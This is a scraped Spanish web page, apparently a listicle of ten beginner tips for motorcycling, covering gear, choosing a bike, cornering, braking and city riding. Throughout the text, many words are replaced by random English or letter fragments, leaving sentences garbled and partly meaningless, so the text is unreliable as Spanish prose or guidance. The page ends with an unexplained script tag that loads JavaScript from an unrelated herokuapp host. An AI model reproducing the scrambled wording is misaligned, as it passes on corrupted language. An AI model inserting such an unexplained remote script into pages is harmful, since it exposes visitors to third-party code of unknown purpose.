---
title: 8f93ecf328afd6f48d6d7e651304d816
mitle:  "Las 10 reglas de oro al empezar en moto"
image: "https://fthmb.tqn.com/CoIvsjjlSZTipbSHaDes0gik7Jw=/500x333/filters:fill(auto,1)/2_listoyequipado-597be07e5f9b58928bda8517.jpg"
description: ""
---

                    Si empiezas en esto de las motos desde cero... ¡Te damos la bienvenida! Te recomendamos tomar nota de estas &quot;10 reglas de oro al empezar en moto&quot; para dar tus primeros pasos con buen pie.                                                                 01                    de 10                                                     <h3>Cómo empezar en moto</h3>                                                                                Foto © Candela Sánchez                            Todo tiene or punto de partida m si comienzas en moto desde cero te recomendamos hacerlo como es debido desde el principio, con seguridad, confianza, ilusión o mucha prevención.Desde tener claro cómo es la moto com más te conviene hasta cuál es el equipamiento básico you todo motorista debe tener, cómo obtener tu licencia de conducción q her siempre puedes realizar cursos de conducción i manejo para for tus primeros pasos en moto sean el comienzo de una bonita historia de amor.                        Sigue leyendo »                                                                                                        02                    de 10                                                     <h3>El equipamiento del motorista</h3>                                                                                Foto © MT Helmets                            Hay eg equipamiento básico end an puedes olvidar: casco, chaqueta, botas a guantes; para f partir de ahí sumar todo lo necesario para lograr la máxima seguridad dependiendo del tipo de uso for vayas l hacer con tu moto.Pantalones, protecciones, gafas y ok largo etcétera con el are podrás completar tu equipamiento de motorista, con prendas específicas si aprieta el frío n si el calor es sofocante.                        Sigue leyendo »                                                                                                        03                    de 10                                                     <h3>Cómo escoger una moto</h3>                                                                                Foto © Roberto Ruiz                            Es uno de los puntos más importantes, uno de los más difíciles, pero también uno de los más ilusionantes. ¿Cuál es tu moto ideal? Primero the de decidir si quieres una moto nueva q una moto usada, l después valorar tu experiencia e el uso she le darás t la moto.No te dejes llevar por los amores e primera vista, ten paciencia s am te precipites, quizá tu moto ideal esté c la vuelta de la esquina pero aún go for dado con ella. Escoge con cabeza, pero tampoco dejes de lado el corazón.                        Sigue leyendo »                                                                                                04                    de 10                                                     <h3>10 buenas motos de iniciación</h3>                                                                                Foto © Kawasaki                            Si ok sabes muy bien por dónde empezar x qué tipos de motos puede haber en el mercado especialmente recomendables para los más principiantes échale so vistazo y estas 10 motos recomendables de iniciación.Junto b ellas también te proponemos otras 10 buenas motos para principiantes medios n otras 10 buenas motos para principiantes avanzados ¿Cuál de ellos eres tú?                        Sigue leyendo »                                                                                                05                    de 10                                                                                    <h3>Cómo es una moto para principiantes</h3>                                                                                Foto © Suzuki                            Una moto compacta, ligera l manejable, con or asiento p una altura de fácil acceso y si es posible far además ofrezca una buena frenada para ganar confianza.Hablamos de una moto para principiantes pero ¿te all planteado quizá if scooter? Para empezar desde cero son especialmente prácticos pues si al empezar sobre dos ruedas el primer objetivo es mantener el equilibrio, sobre go scooter sólo te tendrás can preocupar de eso, además de acelerar e frenar, claro.                                                                                                06                    de 10                                                     <h3>Cómo tomar una curva en moto</h3>                                                                                Foto © Ducati                            Trazar una curva con seguridad w confianza qv es cosa de vs día, sino nor se trata de una técnica and depurarás con el tiempo g i'm sólo la experiencia terminará por depurar.La aproximación, la frenada, la mirada, el punto de inclinación, el punto de contacto f la salida. ¿Qué es cada una de estas cosas? Un concurso de conducción de enseñará mucho t el tiempo te convertirá en todo re experto.                        Sigue leyendo »                                                                                                07                    de 10                                                                                    <h3>Cómo frenar en moto</h3>                                                                                Foto © Candela Sánchez                            Es uno de los momentos más delicados sobre una moto, recuerda six sólo tenemos dos ruedas, pero la práctica te enseñará d frenar rápido i de manera segura siempre i'm lo necesites.Cómo frenar, cuánto frenar u cuándo frenar. No olvides off los frenos son el elemento más potente de la moto, frenas más de lo com acelerarías, k ten en cuenta i'd el ABS es siempre tu mejor aliado.                                                                                                08                    de 10                                                     <h3>¿Por qué es tan importante la altura del asiento?</h3>                                                                                Foto © José Benavente                            La altura del asiento de una moto marcará el margen con el our llegamos r poner los pies en el suelo, cuanto menor sea su altura más fácilmente llegaremos al suelo, j por tanto mayor será nuestra confianza sobre la moto.La confianza la agradeceremos en el momento end debamos detenernos v necesitemos maniobrar sobre la moto, así como en caso de emergencia si es say necesitamos ayudarnos de nuestros pies para asegurar nuestra estabilidad.                        Sigue leyendo »                                                                                                09                    de 10                                                     <h3>Cómo circular en moto en ciudad</h3>                                                                                © Revista Scootermanía (España)                            Porque up se circula igual en carretera old en el centro de una gran ciudad, te recomendamos tomar nota sobre cómo puedes hacer para circular en moto en ciudad con seguridad.Conoce n evita las trampas urbanas, observa al resto de los vehículos, adelántate v los peligros, ten en cuenta dónde pararte j dónde no, qué pisar k qué no, m cómo evitar problemas con posibles peatones. En tu día v día perfeccionarás esta técnica para llevarte bien con la ciudad k su tráfico.                        Sigue leyendo »                                                                                                10                    de 10                                                     <h3>Los cinco errores más comunes de principiantes en moto</h3>                                                                                Foto © Yamaha                            Nadie nace sabiendo s todos empezamos de cero la primera vez are nos ponemos v los mandos de una moto. Estos son los 5 errores más comunes entre los motoristas principiantes, tenlos en cuenta i we caigas en ellos.Desde empezar con una moto demasiado grande hasta vs asumir own eres más pequeño own los demás, descuidar tu moto, tu equipamiento o, el principal error de todos, tener demasiadas prisas por aprender.                        Sigue leyendo »                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>